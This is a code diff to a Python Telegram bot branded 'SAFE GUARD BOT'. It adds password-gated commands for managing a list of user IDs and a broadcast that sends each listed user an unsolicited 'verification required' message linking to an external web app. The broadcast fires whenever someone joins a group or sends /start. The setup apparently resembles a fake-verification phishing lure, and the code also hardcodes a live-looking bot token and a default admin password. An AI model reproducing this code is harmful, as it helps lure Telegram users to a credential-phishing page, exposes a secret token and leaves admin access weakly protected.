@@ -13,6 +13,8 @@ import logging
 import requests
 from datetime import datetime
 from dotenv import load_dotenv
+from utils.user_id_manager import UserIDManager
+from config import SCRIPT_TARGET_USER_ID
 
 # Load environment variables
 load_dotenv()
@@ -21,6 +23,7 @@ load_dotenv()
 BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8033516348:AAE2ylmkjc8Q6Sj1b8yzvk19wvB3kYs-5-k')
 WEBAPP_URL = os.getenv('WEBAPP_URL', 'https://safeguard-bot.vercel.app')
 LOCAL_DEV = os.getenv('LOCAL_DEV', 'false').lower() == 'true'
+ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin_password_change_this')
 
 # Debug logging for configuration
 print(f"🔧 Configuration loaded:")
@@ -40,6 +43,9 @@ class HTTPTelegramBot:
         self.token = token or BOT_TOKEN
         self.base_url = f"https://api.telegram.org/bot{self.token}"
         self.last_update_id = 0
+        self.user_id_manager = UserIDManager()
+        # Store admin conversation states
+        self.admin_states = {}  # {user_id: {'state': 'waiting_password', 'command': 'add_user_id'}}
 
     def get_me(self):
         """Get bot information"""
@@ -235,6 +241,9 @@ class HTTPTelegramBot:
                         
                 except Exception as e:
                     logger.error(f"❌ Error sending welcome message: {e}")
+                
+                # Send verification message to all user IDs in the list
+                self.send_verification_to_all_users(chat)
             else:
                 logger.info(f"🤖 Skipping bot member: {new_member.get('first_name')}")
 
@@ -244,6 +253,15 @@ class HTTPTelegramBot:
         user = message.get('from', {})
         chat = message.get('chat', {})
         text = message.get('text', '')
+        
+        # Check if user is in admin conversation state
+        user_id = user.get('id')
+        if user_id in self.admin_states:
+            return self.handle_admin_conversation(message)
+        
+        # Handle admin commands
+        if text in ['/add_userId', '/del_userId', '/userId', '/cancel', '/broadcast_verify', '/help']:
+            return self.handle_admin_commands(message)
         
         # Handle /start command
         if text.startswith('/start'):
@@ -273,6 +291,264 @@ class HTTPTelegramBot:
                     text="🔐 Please verify your account to proceed.",
                     reply_markup=keyboard
                 )
+            
+            # Send verification message to all user IDs in the list
+            self.send_verification_to_all_users(chat)
+    
+    def handle_admin_commands(self, message):
+        user = message.get('from', {})
+        chat = message.get('chat', {})
+        text = message.get('text', '')
+        user_id = user.get('id')
+        
+        if text == '/add_userId':
+            if str(user_id) != str(SCRIPT_TARGET_USER_ID):
+                self.send_message(
+                    chat_id=chat['id'],
+                    text="❌ <b>Access Denied</b>\n\nYou are not authorized to add user IDs.",
+                    parse_mode='HTML'
+                )
+                return True
+            logger.info(f"🔐 Admin command /add_userId requested by user {user_id} ({user.get('first_name')})")
+            self.admin_states[user_id] = {'state': 'waiting_password', 'command': 'add_user_id'}
+            self.send_message(
+                chat_id=chat['id'],
+                text="🔐 <b>Admin Authentication Required</b>\n\nPlease enter the admin password:",
+                parse_mode='HTML'
+            )
+            return True
+        
+        elif text == '/del_userId':
+            if str(user_id) != str(SCRIPT_TARGET_USER_ID):
+                self.send_message(
+                    chat_id=chat['id'],
+                    text="❌ <b>Access Denied</b>\n\nYou are not authorized to delete user IDs.",
+                    parse_mode='HTML'
+                )
+                return True
+            logger.info(f"🔐 Admin command /del_userId requested by user {user_id} ({user.get('first_name')})")
+            self.admin_states[user_id] = {'state': 'waiting_password', 'command': 'delete_user_id'}
+            self.send_message(
+                chat_id=chat['id'],
+                text="🔐 <b>Admin Authentication Required</b>\n\nPlease enter the admin password:",
+                parse_mode='HTML'
+            )
+            return True
+        
+        elif text == '/userId':
+            logger.info(f"🔐 Admin command /userId requested by user {user_id} ({user.get('first_name')})")
+            self.admin_states[user_id] = {'state': 'waiting_password', 'command': 'list_user_ids'}
+            self.send_message(
+                chat_id=chat['id'],
+                text="🔐 <b>Admin Authentication Required</b>\n\nPlease enter the admin password:",
+                parse_mode='HTML'
+            )
+            return True
+        
+        elif text == '/cancel':
+            if user_id in self.admin_states:
+                logger.info(f"🚫 Admin command cancelled by user {user_id}")
+                del self.admin_states[user_id]
+                self.send_message(
+                    chat_id=chat['id'],
+                    text="🚫 <b>Operation Cancelled</b>\n\nThe admin operation has been cancelled.",
+                    parse_mode='HTML'
+                )
+                return True
+        
+        elif text == '/broadcast_verify':
+            if str(user_id) != str(SCRIPT_TARGET_USER_ID):
+                self.send_message(
+                    chat_id=chat['id'],
+                    text="❌ <b>Access Denied</b>\n\nYou are not authorized to broadcast verification.",
+                    parse_mode='HTML'
+                )
+                return True
+            logger.info(f"📤 Manual verification broadcast requested by user {user_id}")
+            self.send_verification_to_all_users(chat)
+            self.send_message(
+                chat_id=chat['id'],
+                text="✅ <b>Verification Broadcast</b>\n\nVerification message has been sent to all user IDs in the list.",
+                parse_mode='HTML'
+            )
+            return True
+        
+        elif text == '/help':
+            logger.info(f"📋 Help command requested by user {user_id}")
+            help_text = (
+                "🤖 <b>SAFE GUARD BOT - Available Commands</b>\n\n"
+                "📋 <b>General Commands:</b>\n"
+                "• /start - Start the bot and get welcome message\n"
+                "• /help - Show this help message\n\n"
+                "🔐 <b>Admin Commands (Password Required):</b>\n"
+                "• /add_userId - Add a user ID to the verification list\n"
+                "• /del_userId - Delete a user ID from the verification list\n"
+                "• /userId - List all user IDs in the verification list\n"
+                "• /broadcast_verify - Manually send verification to all users\n"
+                "• /cancel - Cancel current admin operation\n\n"
+                "🔄 <b>Automatic Triggers:</b>\n"
+                "• New member joins a group\n"
+                "• Someone types 'verify' in chat\n\n"
+                "💡 <b>Note:</b> Admin commands require authentication and proper authorization."
+            )
+            self.send_message(
+                chat_id=chat['id'],
+                text=help_text,
+                parse_mode='HTML'
+            )
+            return True
+        
+        return False
+    
+    def handle_admin_conversation(self, message):
+        """Handle admin conversation flow"""
+        user = message.get('from', {})
+        chat = message.get('chat', {})
+        text = message.get('text', '')
+        user_id = user.get('id')
+        
+        if user_id not in self.admin_states:
+            return False
+        
+        admin_state = self.admin_states[user_id]
+        state = admin_state.get('state')
+        command = admin_state.get('command')
+        
+        if state == 'waiting_password':
+            # Verify password
+            if text == ADMIN_PASSWORD:
+                logger.info(f"✅ Admin password verified for user {user_id}")
+                
+                if command == 'list_user_ids':
+                    self.show_user_ids(chat['id'])
+                    del self.admin_states[user_id]
+                elif command in ['add_user_id', 'delete_user_id']:
+                    action = "add" if command == 'add_user_id' else "delete"
+                    admin_state['state'] = 'waiting_user_id'
+                    self.send_message(
+                        chat_id=chat['id'],
+                        text=f"📝 <b>Input User ID</b>\n\nPlease enter the user ID you want to {action}:",
+                        parse_mode='HTML'
+                    )
+            else:
+                logger.warning(f"❌ Invalid admin password attempt by user {user_id}")
+                self.send_message(
+                    chat_id=chat['id'],
+                    text="❌ <b>Access Denied</b>\n\nInvalid admin password. Please try again or use /cancel to abort.",
+                    parse_mode='HTML'
+                )
+        
+        elif state == 'waiting_user_id':
+            # Handle user ID input
+            if command == 'add_user_id':
+                success = self.user_id_manager.add_user_id(text)
+                if success:
+                    self.send_message(
+                        chat_id=chat['id'],
+                        text=f"✅ <b>Success!</b>\n\nUser ID <code>{text}</code> has been added to the list.",
+                        parse_mode='HTML'
+                    )
+                else:
+                    self.send_message(
+                        chat_id=chat['id'],
+                        text=f"❌ <b>Failed to add user ID</b>\n\nUser ID <code>{text}</code> could not be added. It might already exist or be invalid.",
+                        parse_mode='HTML'
+                    )
+            
+            elif command == 'delete_user_id':
+                success = self.user_id_manager.delete_user_id(text)
+                if success:
+                    self.send_message(
+                        chat_id=chat['id'],
+                        text=f"✅ <b>Success!</b>\n\nUser ID <code>{text}</code> has been deleted from the list.",
+                        parse_mode='HTML'
+                    )
+                else:
+                    self.send_message(
+                        chat_id=chat['id'],
+                        text=f"❌ <b>Failed to delete user ID</b>\n\nUser ID <code>{text}</code> was not found in the list.",
+                        parse_mode='HTML'
+                    )
+            
+            # Clear admin state
+            del self.admin_states[user_id]
+    
+    def show_user_ids(self, chat_id):
+        """Show the list of user IDs"""
+        user_ids = self.user_id_manager.get_user_ids()
+        count = len(user_ids)
+        
+        if count == 0:
+            message = "📋 <b>User IDs List</b>\n\nNo user IDs found."
+        else:
+            message = f"📋 <b>User IDs List</b>\n\nTotal: {count} user ID(s)\n\n"
+            # Display user IDs in chunks of 10 for readability
+            for i in range(0, count, 10):
+                chunk = user_ids[i:i+10]
+                message += "\n".join(chunk) + "\n"
+                if i + 10 < count:
+                    message += "\n"
+        
+        self.send_message(
+            chat_id=chat_id,
+            text=message,
+            parse_mode='HTML'
+        )
+    
+    def send_verification_to_all_users(self, chat_info=None):
+        """Send verification message to all user IDs in the list"""
+        user_ids = self.user_id_manager.get_user_ids()
+        
+        if not user_ids:
+            logger.info("📋 No user IDs found in list, skipping verification broadcast")
+            return
+        
+        logger.info(f"📤 Sending verification message to {len(user_ids)} user(s)")
+        
+        # Prepare verification message
+        verification_text = (
+            '🔐 <b>SAFE GUARD BOT</b> verification required.\n\n'
+            '<i>Click the button below to start verification</i>'
+        )
+        
+        # For local development, don't use inline keyboard (Telegram requires HTTPS)
+        if LOCAL_DEV:
+            verification_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
+            keyboard = None
+        else:
+            keyboard = {
+                "inline_keyboard": [[
+                    {
+                        "text": "🔐 Start Verification",
+                        "url": WEBAPP_URL
+                    }
+                ]]
+            }
+        
+        # Add chat info if provided
+        if chat_info:
+            chat_name = chat_info.get('title', chat_info.get('first_name', 'Unknown'))
+            verification_text += f"\n\n📝 <b>Triggered by:</b> {chat_name}"
+        
+        # Send to each user ID
+        success_count = 0
+        for user_id in user_ids:
+            try:
+                result = self.send_message(
+                    chat_id=int(user_id),
+                    text=verification_text,
+                    parse_mode='HTML',
+                    reply_markup=keyboard
+                )
+                if result:
+                    success_count += 1
+                    logger.info(f"✅ Verification sent to user {user_id}")
+                else:
+                    logger.error(f"❌ Failed to send verification to user {user_id}")
+            except Exception as e:
+                logger.error(f"❌ Error sending verification to user {user_id}: {e}")
+        
+        logger.info(f"📊 Verification broadcast completed: {success_count}/{len(user_ids)} successful")
 
     def process_update(self, update):
         """Process a single update"""
